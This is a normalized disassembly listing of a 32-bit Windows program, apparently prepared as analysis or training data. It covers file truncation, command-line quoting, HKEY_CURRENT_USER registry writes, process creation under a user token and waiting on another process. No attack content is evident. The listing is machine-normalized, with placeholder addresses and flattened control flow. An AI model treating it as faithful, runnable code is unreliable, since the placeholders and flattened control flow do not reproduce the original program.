mov eax 0x5
jmp r-xdata
push 0x0
lea ecx [ ebp + 0x8 ]
push ecx
call sub_401040
add esp 0x8
mov edx [ ebp - 0x8 ]
mov [ edx + 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax 0x5
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov eax 0x5
jmp r-xdata
sub_402270
push ebp
mov ebp esp
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x11c ] ecx
mov eax [ ebp - 0x11c ]
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov edx [ ebp - 0x11c ]
mov eax [ rw-data ]
mov [ edx + 0x14 ] eax
mov ecx [ rw-data ]
add ecx 0x1
mov [ rw-data ] ecx
mov edx [ ebp - 0x11c ]
mov eax [ edx + 0x14 ]
push eax
mov ecx [ rw-data ]
push ecx
push r--data
push 0x104
mov edx [ ebp - 0x11c ]
add edx 0x3c
push edx
call sub_401540
add esp 0x14
mov eax [ ebp - 0x11c ]
add eax 0x3c
push eax
call sub_4120b4
add esp 0x4
push r--data
mov ecx [ ebp - 0x11c ]
add ecx 0x3c
push ecx
call sub_412b5e
add esp 0x8
mov [ ebp - 0x114 ] eax
cmp [ ebp - 0x114 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x104
lea edx [ ebp - 0x110 ]
push edx
push 0xffffffff
mov eax [ ebp - 0x11c ]
mov ecx [ eax + 0xc ]
push ecx
push 0x0
push 0xfde9
call [ WideCharToMultiByte@IAT ]
test eax eax
jne r-xdata
mov eax 0x7
jmp r-xdata
mov edx [ ebp - 0x114 ]
push edx
lea eax [ ebp - 0x110 ]
push eax
mov ecx rw-data
call sub_407710
mov [ ebp - 0x118 ] eax
mov ecx [ ebp - 0x114 ]
push ecx
call sub_412a1c
add esp 0x4
mov eax [ ebp - 0x118 ]
call [ GetLastError@IAT ]
push eax
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov eax 0x10
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
sub_4023d0
push ebp
mov ebp esp
sub esp 0x70
mov [ ebp - 0x6c ] ecx
mov eax [ ebp - 0x6c ]
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
push r--data
mov edx [ ebp - 0x6c ]
add edx 0x3c
push edx
call sub_412b5e
add esp 0x8
push eax
lea ecx [ ebp - 0xc ]
call sub_402750
lea ecx [ ebp - 0xc ]
call sub_4027d0
test eax eax
jne r-xdata
mov eax [ ebp - 0x6c ]
add eax 0x18
push eax
lea ecx [ ebp - 0xc ]
call sub_4027d0
push eax
call sub_406a50
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov [ ebp - 0x4c ] 0x6
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x4c ]
jmp r-xdata
mov [ ebp - 0x10 ] 0x0
push rw-data
mov edx [ ebp - 0x6c ]
mov eax [ edx + 0x10 ]
push eax
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x50 ] ecx
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x50 ]
jmp r-xdata
mov esp ebp
pop ebp
retn
push r--data
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x10 ]
push edx
call sub_412b5e
add esp 0x8
mov [ ebp - 0x10 ] eax
push r--data
push rw-data
call sub_412b5e
add esp 0x8
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0x6c ]
call sub_401fb0
mov [ ebp - 0x14 ] eax
mov ecx [ ebp - 0x10 ]
push ecx
call sub_412a1c
add esp 0x4
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x10 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov [ ebp - 0x54 ] 0x6
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x54 ]
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
lea eax [ ebp - 0x48 ]
push eax
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x10 ]
push edx
call sub_411b05
add esp 0x8
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x58 ] edx
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x58 ]
jmp r-xdata
mov eax [ ebp - 0x6c ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_4014e0
add esp 0x4
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x10 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov [ ebp - 0x5c ] 0x6
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x5c ]
jmp r-xdata
mov [ ebp - 0x1 ] 0x1
push 0x0
push 0x80
push 0x2
push 0x0
push 0x0
push 0x40000000
mov eax [ ebp - 0x6c ]
mov ecx [ eax + 0x10 ]
push ecx
call [ CreateFileW@IAT ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov edx [ ebp - 0x14 ]
mov [ ebp - 0x60 ] edx
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x60 ]
jmp r-xdata
movzx ecx [ ebp - 0x1 ]
test ecx ecx
je r-xdata
push 0x0
push 0x0
mov edx [ ebp - 0x6c ]
mov eax [ edx + 0x28 ]
push eax
mov ecx [ ebp - 0x8 ]
push ecx
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x70 ] r--data
mov [ ebp - 0x70 ] r--data
jmp r-xdata
mov eax [ ebp - 0x8 ]
push eax
call [ CloseHandle@IAT ]
mov edx [ ebp - 0x8 ]
push edx
call [ SetEndOfFile@IAT ]
test eax eax
je r-xdata
movzx eax [ ebp - 0x1 ]
test eax eax
jne r-xdata
call sub_4119bb
mov eax [ eax ]
push eax
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x10 ]
push edx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x10
mov [ ebp - 0x64 ] 0x7
lea ecx [ ebp - 0x18 ]
call sub_402770
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x64 ]
jmp r-xdata
movzx edx [ ebp - 0x42 ]
push edx
mov eax [ ebp - 0x70 ]
push eax
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x10 ]
push edx
call sub_4027e0
add esp 0xc
push eax
lea ecx [ ebp - 0x18 ]
call sub_402750
lea ecx [ ebp - 0x18 ]
call sub_4027d0
test eax eax
jne r-xdata
mov [ ebp - 0x1 ] 0x0
lea ecx [ ebp - 0x18 ]
call sub_4027d0
push eax
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x38 ]
push edx
lea ecx [ ebp - 0xc ]
call sub_4027d0
push eax
mov eax [ ebp - 0x6c ]
add eax 0x18
push eax
call sub_406b60
add esp 0x10
mov [ ebp - 0x14 ] eax
push 0x0
lea ecx [ ebp - 0xc ]
call sub_4027a0
mov ecx [ ebp - 0x6c ]
add ecx 0x3c
push ecx
call sub_4120b4
add esp 0x4
xor edx edx
mov eax [ ebp - 0x6c ]
mov [ eax + 0x3c ] dx
mov ecx [ ebp - 0x6c ]
mov edx [ ecx + 0x38 ]
push edx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x6c ]
mov [ eax + 0x38 ] 0x0
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x68 ] ecx
lea ecx [ ebp - 0x18 ]
call sub_402770
lea ecx [ ebp - 0xc ]
call sub_402770
mov eax [ ebp - 0x68 ]
push 0x0
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_4027d0
push eax
call sub_412bff
add esp 0xc
sub_402770
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_412a1c
add esp 0x4
sub_4027a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn 0x4
mov ecx [ ebp - 0x4 ]
mov edx [ ecx ]
push edx
call sub_412a1c
add esp 0x4
sub_4027e0
push ebp
mov ebp esp
sub esp 0x38
mov eax [ ebp + 0x8 ]
push eax
call sub_401740
add esp 0x4
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_412b5e
add esp 0x8
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push eax
call sub_402890
add esp 0x4
movzx ecx al
test ecx ecx
je r-xdata
mov edx [ ebp + 0x10 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_4120e4
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
lea edx [ ebp - 0x38 ]
push edx
mov eax [ ebp + 0x8 ]
push eax
call sub_411b05
add esp 0x8
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x0
je r-xdata
movzx ecx [ ebp - 0x32 ]
cmp ecx [ ebp + 0x10 ]
je r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_412a1c
add esp 0x4
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_412a1c
add esp 0x4
mov eax [ ebp - 0x4 ]
sub_402890
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push eax
call sub_411794
add esp 0x4
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
cmp edx 0x72
je r-xdata
xor al al
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1
jbe r-xdata
xor al al
jmp r-xdata
mov esp ebp
pop ebp
retn
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_412c84
add esp 0x8
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0x2 ]
cmp ecx 0x2b
jne r-xdata
mov al 0x1
xor al al
jmp r-xdata
xor al al
jmp r-xdata
sub_402900
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
push r--data
call sub_401190
push eax
call sub_408470
add esp 0xc
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x10 ]
push ecx
call sub_401860
add esp 0x8
mov esp ebp
pop ebp
retn 0x4
sub_402940
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
push 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_401040
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x14 ] eax
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x14 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x5
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_401000
mov eax 0x5
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_4029a0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x14 ]
push ecx
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d00
mov edx [ ebp - 0x4 ]
mov [ edx + 0x14 ] 0x0
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_4029e0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call sub_401d30
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_402a00
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_401e80
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_402a30
push ebp
mov ebp esp
sub esp 0x8
mov [ ebp - 0x8 ] ecx
push 0x0
lea eax [ ebp + 0x8 ]
push eax
call sub_401040
add esp 0x8
mov ecx [ ebp - 0x8 ]
mov [ ecx + 0x244 ] eax
mov edx [ ebp - 0x8 ]
cmp [ edx + 0x244 ] 0x0
jne r-xdata
lea eax [ ebp + 0x8 ]
push eax
push r--data
call sub_4011d0
add esp 0x8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax 0x5
jmp r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x8 ]
call sub_4021f0
mov eax 0x5
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_402aa0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
push 0x0
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x244 ]
push ecx
call sub_411f69
add esp 0x8
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
call sub_402270
mov edx [ ebp - 0x4 ]
mov [ edx + 0x244 ] 0x0
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_402ae0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x4 ]
call sub_4023d0
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_402b10
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x244 ] 0x0
jne r-xdata
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx [ ebp - 0x4 ]
call sub_402900
jmp r-xdata
mov esp ebp
pop ebp
retn 0x4
sub_402b40
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0xc ] 0x0
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x8 ]
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
push ecx
call sub_402c20
add esp 0x4
mov edx [ ebp - 0xc ]
lea eax [ edx + eax + 0x1 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
shl ecx 0x1
push ecx
call sub_412584
add esp 0x4
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov [ ebp - 0xc ] 0x1
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x8 ]
jge r-xdata
mov esp ebp
pop ebp
retn
xor ecx ecx
mov edx [ ebp - 0x10 ]
mov [ edx ] cx
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ eax + edx * 4 ]
push ecx
mov edx [ ebp - 0x10 ]
push edx
call sub_402cd0
add esp 0x8
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x1
cmp eax [ ebp + 0x8 ]
je r-xdata
jmp r-xdata
mov ecx 0x20
mov edx [ ebp - 0x10 ]
mov [ edx ] cx
mov eax [ ebp - 0x10 ]
add eax 0x2
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x1
mov [ ebp - 0x4 ] eax
sub_402c20
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
push eax
call sub_411794
add esp 0x4
mov [ ebp - 0xc ] eax
push 0x22
mov ecx [ ebp + 0x8 ]
push ecx
call sub_412cfe
add esp 0x8
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x10 ] eax
push r--data
mov edx [ ebp + 0x8 ]
push edx
call sub_412cbb
add esp 0x8
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x4 ] eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
add eax 0x2
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
mov esp ebp
pop ebp
retn
mov ecx [ ebp + 0x8 ]
movzx edx [ ecx ]
test edx edx
je r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
cmp ecx 0x5c
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx ecx [ eax ]
cmp ecx 0x22
jne r-xdata
mov edx [ ebp - 0x8 ]
add edx 0x1
mov [ ebp - 0x8 ] edx
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
add edx 0x2
mov [ ebp + 0x8 ] edx
jmp r-xdata
sub_402cd0
push ebp
mov ebp esp
sub esp 0x10
mov [ ebp - 0x8 ] 0x0
push 0x22
mov eax [ ebp + 0xc ]
push eax
call sub_412cfe
add esp 0x8
neg eax
sbb eax eax
neg eax
mov [ ebp - 0xc ] eax
push r--data
mov ecx [ ebp + 0xc ]
push ecx
call sub_412cbb
add esp 0x8
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x4 ] eax
je r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx 0x22
mov eax [ ebp + 0x8 ]
mov [ eax ] dx
mov ecx [ ebp + 0x8 ]
add ecx 0x2
mov [ ebp + 0x8 ] ecx
mov ecx [ ebp + 0xc ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
call sub_412d52
add esp 0x8
mov eax [ ebp + 0xc ]
push eax
call sub_411794
add esp 0x4
mov ecx [ ebp + 0x8 ]
lea edx [ ecx + eax * 2 ]
mov [ ebp + 0x8 ] edx
mov edx [ ebp + 0xc ]
movzx eax [ edx ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov esp ebp
pop ebp
retn
mov eax 0x22
mov ecx [ ebp + 0x8 ]
mov [ ecx ] ax
mov edx [ ebp + 0x8 ]
add edx 0x2
mov [ ebp + 0x8 ] edx
jmp r-xdata
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
cmp edx 0x5c
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0xc ]
movzx edx [ ecx ]
cmp edx 0x22
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x1
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov [ ebp - 0x8 ] 0x0
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov cx [ eax ]
mov [ edx ] cx
mov edx [ ebp + 0x8 ]
add edx 0x2
mov [ ebp + 0x8 ] edx
mov eax [ ebp + 0xc ]
add eax 0x2
mov [ ebp + 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
cmp ecx [ ebp - 0x8 ]
jg r-xdata
mov edx 0x5c
mov eax [ ebp + 0x8 ]
mov [ eax ] dx
mov ecx [ ebp + 0x8 ]
add ecx 0x2
mov [ ebp + 0x8 ] ecx
jmp r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
sub_402e00
push ebp
mov ebp esp
sub esp 0x70
mov eax [ ebp + 0x10 ]
push eax
mov ecx [ ebp + 0xc ]
push ecx
call sub_402b40
add esp 0x8
mov [ ebp - 0x64 ] eax
cmp [ ebp - 0x64 ] 0x0
jne r-xdata
mov [ ebp - 0x60 ] 0x0
push 0x40
push 0x0
lea edx [ ebp - 0x5c ]
push edx
call sub_412f80
add esp 0xc
mov [ ebp - 0x60 ] 0x44
mov [ ebp - 0x58 ] r--data
mov [ ebp - 0x14 ] 0x0
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] eax
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x68 ] 0x0
push 0x1
mov edx [ ebp + 0x14 ]
push edx
lea eax [ ebp - 0x68 ]
push eax
call CreateEnvironmentBlock
test eax eax
jne r-xdata
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x60 ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x64 ]
push eax
mov ecx [ ebp + 0x8 ]
push ecx
call [ CreateProcessW@IAT ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x60 ]
push edx
push 0x0
mov eax [ ebp - 0x68 ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
mov ecx [ ebp - 0x64 ]
push ecx
mov edx [ ebp + 0x8 ]
push edx
mov eax [ ebp + 0x14 ]
push eax
call [ CreateProcessAsUserW@IAT ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x68 ] 0x0
je r-xdata
mov [ ebp - 0x68 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp - 0x68 ]
push ecx
call DestroyEnvironmentBlock
mov [ ebp - 0x6c ] 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x6c ]
push eax
push 0x400
call [ GetLastError@IAT ]
push eax
push 0x0
push 0x1300
call [ FormatMessageW@IAT ]
cmp [ ebp - 0x6c ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
mov [ ebp - 0x70 ] r--data
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x70 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push ecx
call [ CloseHandle@IAT ]
mov edx [ ebp + 0x18 ]
mov eax [ ebp - 0x14 ]
mov [ edx ] eax
jmp r-xdata
mov ecx [ ebp - 0x64 ]
push ecx
call sub_4121b5
add esp 0x4
mov eax [ ebp - 0x4 ]
mov eax [ ebp - 0x6c ]
push eax
call [ LocalFree@IAT ]
mov edx [ ebp - 0x70 ]
push edx
push r--data
call sub_412ecb
add esp 0x8
cmp [ ebp - 0x6c ] 0x0
je r-xdata
mov edx [ ebp - 0x10 ]
push edx
call [ CloseHandle@IAT ]
jmp r-xdata
sub_402f90
push ebp
mov ebp esp
mov eax 0x1b80
call sub_4137d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp + 0x8 ]
push ecx
call sub_407a10
add esp 0x8
cmp [ ebp + 0x8 ] 0x3
jge r-xdata
mov edx [ ebp + 0xc ]
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
push 0x104
mov ecx [ ebp + 0xc ]
mov edx [ ecx + 0x8 ]
push edx
push rw-data
call sub_4134a9
add esp 0xc
xor eax eax
mov [ rw-data ] ax
push 0x5c
push rw-data
call sub_404520
add esp 0x8
mov [ ebp - 0x444 ] eax
cmp [ ebp - 0x444 ] 0x0
je r-xdata
push r--data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov eax 0x1
jmp r-xdata
mov [ ebp - 0x41a ] 0x0
mov [ ebp - 0x431 ] 0x0
push r--data
call sub_413426
add esp 0x4
neg eax
sbb eax eax
neg eax
mov [ ebp - 0x419 ] al
push r--data
call sub_41335a
add esp 0x4
push 0x0
lea edx [ ebp - 0x44c ]
push edx
push 0x0
push 0x2
push 0x0
push 0x0
push 0x0
push r--data
push 0x80000001
call [ RegCreateKeyExW@IAT ]
mov eax [ ebp - 0x44c ]
push eax
call [ RegCloseKey@IAT ]
push 0x0
lea ecx [ ebp - 0x44c ]
push ecx
push 0x0
push 0x2
push 0x1
push 0x0
push 0x0
push r--data
push 0x80000001
call [ RegCreateKeyExW@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x444 ]
movzx edx [ ecx + 0x2 ]
test edx edx
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_411f81
mov esp ebp
pop ebp
retn
mov [ ebp - 0x430 ] 0x0
mov [ ebp - 0x42c ] 0x0
cmp [ ebp + 0x8 ] 0x3
jle r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
mov edx [ ebp - 0x44c ]
push edx
call [ RegSetValueExW@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
mov eax [ ebp - 0x44c ]
push eax
call [ RegSetValueExW@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push r--data
mov ecx [ ebp - 0x44c ]
push ecx
call [ RegSetValueExW@IAT ]
mov edx [ ebp - 0x44c ]
push edx
call [ RegCloseKey@IAT ]
xor eax eax
mov ecx [ ebp - 0x444 ]
mov [ ecx ] ax
movzx edx [ rw-data ]
test edx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
push ecx
call sub_413132
add esp 0x4
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x42c ] edx
mov edx [ ebp - 0x430 ]
and edx [ ebp - 0x42c ]
cmp edx 0xffffffff
jne r-xdata
push 0x0
push 0x0
push r--data
mov ecx [ rw-data ]
push ecx
call sub_401190
mov ecx eax
call sub_408360
lea eax [ ebp - 0x658 ]
push eax
call sub_4066c0
add esp 0x4
movzx ecx al
test ecx ecx
jne r-xdata
push r--data
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0xc ]
push ecx
call sub_401170
add esp 0x8
test eax eax
je r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
mov eax 0x1
jmp r-xdata
mov edx [ rw-data ]
mov [ ebp - 0x450 ] edx
push 0x1
push r--data
push r--data
mov eax [ ebp - 0x450 ]
push eax
call sub_401190
mov ecx eax
call sub_408360
jmp r-xdata
push r--data
call sub_41360f
add eax 0x40
push eax
call sub_4134f3
add esp 0x8
mov eax 0x1
jmp r-xdata
mov [ rw-data ] 0x1
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
jmp r-xdata
push r--data
call sub_4047e0
add esp 0x4
movzx edx al
test edx edx
jne r-xdata
cmp [ ebp - 0x42c ] 0x0
jl r-xdata
push r--data
call sub_401190
push eax
call sub_408470
add esp 0x8
movzx edx [ rw-data ]
test edx edx
je r-xdata
jg r-xdata
mov [ ebp - 0x424 ] 0x5
push r--data
call sub_413426
add esp 0x4
neg eax
sbb eax eax
neg eax
mov [ rw-data ] al
push r--data
call sub_41335a
add esp 0x4
mov [ ebp - 0x448 ] 0x64
mov [ ebp - 0x420 ] 0xffffffff
xor edx edx
mov [ ebp - 0x418 ] dx
push 0x206
push 0x0
lea eax [ ebp - 0x416 ]
push eax
call sub_412f80
add esp 0xc
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
lea eax [ ebp - 0x868 ]
push eax
push 0x104
call [ GetTempPathW@IAT ]
test eax eax
je r-xdata
mov edx [ ebp - 0x430 ]
push edx
push 0x0
push 0x100000
call [ OpenProcess@IAT ]
mov [ ebp - 0x65c ] eax
cmp [ ebp - 0x65c ] 0x0
je r-xdata
cmp [ ebp - 0x430 ] 0x0
jbe r-xdata
movzx eax [ rw-data ]
test eax eax
je r-xdata
cmp [ ebp + 0x8 ] 0x5
jg r-xdata
lea ecx [ ebp - 0x868 ]
push ecx
call sub_412ffa
add esp 0x4
push 0x1388
mov eax [ ebp - 0x65c ]
push eax
call [ WaitForSingleObject@IAT ]
mov [ ebp - 0x660 ] eax
mov ecx [ ebp - 0x65c ]
push ecx
call [ CloseHandle@IAT ]
cmp [ ebp - 0x660 ] 0x0
je r-xdata
movzx ecx [ rw-data ]
test ecx ecx
jne r-xdata
push rw-data
call sub_4045f0
add esp 0x4
movzx ecx [ rw-data ]
test ecx ecx
je r-xdata
movzx edx [ rw-data ]
test edx edx
jne r-xdata
mov eax 0x1
